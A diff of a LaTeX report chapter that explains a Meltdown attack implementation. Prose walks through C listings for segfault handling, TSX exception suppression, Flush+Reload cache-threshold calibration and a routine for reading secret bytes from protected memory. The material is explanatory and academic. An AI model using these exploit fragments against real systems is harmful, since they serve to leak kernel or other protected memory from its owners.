@@ -359,7 +359,7 @@ This section deals with the implementation of Meltdown\footnote{https://github.c
 Flush+Reload to build a covert channel. The focus of the following is just on the core functionality of the implementation.
 
 \subsection{Transient Instruction Sequence}
-\label{ch:intro:motivation:A}
+\label{ch:TransientInstructionSequence}
 
 Listing ~\ref{lst:meltdown} shows the x86 assembly implementation of the transient instruction sequence
 which enables the Meltdown exploit.
@@ -389,17 +389,48 @@ After execution of line 7 techniques like Flush+Reload or Evict+Reload can be ap
 \subsection{Dealing with Exceptions}
 \label{ch:intro:motivation:A}
 
-\begin{lstlisting}[language=C, caption=Transient Instruction Sequence of Meltdown, label={lst:signal}]
-static void unblock_signal(int signum __attribute__((__unused__))) {
-    sigset_t sigs;
-    sigemptyset(&sigs);
-    sigaddset(&sigs, signum);
-    sigprocmask(SIG_UNBLOCK, &sigs, NULL);
+Meltdown uses exception handling and exception suppression to avoid crashes of the attacker program when accessing protected memory.
+Listing ~\ref{lst:signalhandler} shows an example implementation of an exception handler.
+Signal handlers allow a program to react to certain execution events. 
+\texttt{SIGSEGV} is the event which should be handled in the case of Meltdown because invalid memory locations are accessed.
+Line 3 in this example unblocks the \texttt{SIGSEGV} event and thus prevents crashes when a segmentation fault is detected.
+
+\begin{lstlisting}[language=C, caption=Meltdown: Exception Handling 1, label={lst:signalhandler}]
+static void segfault_handler(int signum) {
+  (void)signum;
+  unblock_signal(SIGSEGV);
+  longjmp(buf, 1);
 }
 \end{lstlisting}
 
-\begin{lstlisting}[language=C, caption=Transient Instruction Sequence of Meltdown, label={lst:tsx}]
-    
+The implementation of \texttt{unblock\_signal} is presented in listing ~\ref{lst:unblocksignal}. 
+Here a signal set is initialized where the \texttt{SIGSEGV} event is added to.
+Afterwards the signal mask of the process is changed by removing \texttt{SIGSEGV} events with \texttt{sigprocmask}.
+This has the consequence that the process is not blocked by segmentation faults, hence raised errors are handled.
+
+\begin{lstlisting}[language=C, caption=Meltdown: Exception Handling 2, label={lst:unblocksignal}]
+static void unblock_signal(int signum __attribute__((__unused__))) {
+  sigset_t sigs;
+  sigemptyset(&sigs);
+  sigaddset(&sigs, signum);
+  sigprocmask(SIG_UNBLOCK, &sigs, NULL);
+}
+\end{lstlisting}
+
+An alternative to exception handling is exception suppression which is realized by reverting grouped instructions.
+This technique is just implemented for Intel TSX processors and can be seen in listing ~\ref{lst:tsx}.
+\texttt{xbegin()} starts a transaction, i.e. a set of instructions.
+\texttt{\_XBEGIN\_STARTED} indicates that a transaction started successfully.
+Line 2 contains the actual Meltdown exploit which is highlighted in chapter ~\ref{ch:TransientInstructionSequence}.
+\texttt{xend()} commits the current transaction so that it gets executed.
+When a segmentation fault is thrown by the CPU the transaction is just rolled back and does not terminate the attacker's process,
+hence raised errors are suppressed.
+
+\begin{lstlisting}[language=C, caption=Meltdown: Exception Suppression on Intel TSX, label={lst:tsx}]
+if (xbegin() == _XBEGIN_STARTED) {
+  MELTDOWN;
+  xend();
+}
 \end{lstlisting}
 
 \subsection{Building a Covert Channel}
@@ -430,10 +461,60 @@ static int __attribute__((always_inline)) flush_reload(void *ptr) {
 }
 \end{lstlisting}
 
-\subsection{Covert Channel Creation}
+Listing ~\ref{lst:computeThreshold} illustrates how the cache threshold can be determined.
+The implementation applies one million iterations to compute a precise threshold value.
+Therefore a pointer \texttt{ptr} is accessed in line 6 so that it's referenced data gets cached. 
+
+\begin{lstlisting}[language=C, caption=Meltdown: Cache Miss Threshold 1, label={lst:computeThreshold}]
+size_t reload_time = 0, flush_reload_time = 0, i, count = 1000000;
+size_t dummy[16];
+size_t *ptr = dummy + 8;
+uint64_t start = 0, end = 0;
+  
+maccess(ptr);
+for (i = 0; i < count; i++) {
+  start = rdtsc();
+  maccess(ptr);
+  end = rdtsc();
+  reload_time += (end - start);
+}
+for (i = 0; i < count; i++) {
+  start = rdtsc();
+  maccess(ptr);
+  end = rdtsc();
+  flush(ptr);
+  flush_reload_time += (end - start);
+}
+reload_time /= count;
+flush_reload_time /= count;
+\end{lstlisting}
+
+Afterwards the access time is measured to detect how long it takes to retrieve the cached value. 
+Then the pointer's referenced data is removed from the cache in line 17 and thus reloaded from memory in every iteration.
+At the end the average access time for cache hits and cache misses are computed.
+Listing ~\ref{lst:computeThreshold} shows the final computation of \texttt{cache\_miss\_threshold}.
+
+\begin{lstlisting}[language=C, caption=Meltdown: Cache Miss Threshold 2, label={lst:finalthreshold}]
+config.cache_miss_threshold = (flush_reload_time + reload_time * 2) / 3;
+\end{lstlisting}
+
+\subsection{Reading Secret Bytes}
 \label{ch:intro:motivation:A}
 
-\begin{lstlisting}[language=C, caption=Meltdown: XXX, label={lst:reload}]
+This section shows how all parts mentioned above are connected to read secret bytes.
+In listing ~\ref{lst:readsecretbytes} a working Meltdown implementation is shown which utilizes
+signal handlers. The implementation for Intel TSX processors is equivalent.
+Just line 6 is specific to the signal handler technique where \texttt{setjmp} is used to save the program's execution state.
+When a segmentation faults occurs \texttt{longjmp} in listing ~\ref{lst:signalhandler} is called to reestablish the program's state
+without restoring the signal mask.
+
+Line 7 contains the Meltdown core instructions shown in listing ~\ref{lst:meltdown}.
+After their execution Flush+Reload is applied to the variable \texttt{mem} which contains the data
+from a specific location of the probe array. As already explained the access location is interweaved with a
+secret byte so that the index of the cached element has to be found to reveal it.
+
+
+\begin{lstlisting}[language=C, caption=Meltdown: Reading Secret Bytes, label={lst:readsecretbytes}]
 int __attribute__((optimize("-Os"), noinline)) libkdump_read_signal_handler() {
     size_t retries = config.retries + 1;
     uint64_t start = 0, end = 0;
@@ -458,10 +539,14 @@ int __attribute__((optimize("-Os"), noinline)) libkdump_read_signal_handler() {
 }
 \end{lstlisting}
 
-\subsection{Retrieving Secret Bytes}
-\label{ch:intro:motivation:A}
+So we iterate over all possible probe array indices to find a cache hit with Flush+Reload in line 12.
+Here \texttt{4096} indicates the memory page size which is multiplied by the index \texttt{i} to access the next element
+of the probe array which contains 256 times 4096 bytes. The access of page sized elements prevents that adjacent elements are loaded
+and cached simultaneously. This would lead to invalid measurement results.
 
-XXXXXXXXXXXXXXXXXXXX
+In line 17 and 19 \texttt{sched\_yield} is called so that the Meltdown attack is executed by the next thread if more
+than one was configured. Increasing the number of threads should improve the chance of reading protected memory.
+
 
 \section{Spectre Implementation}
 \label{ch:intro:motivation}
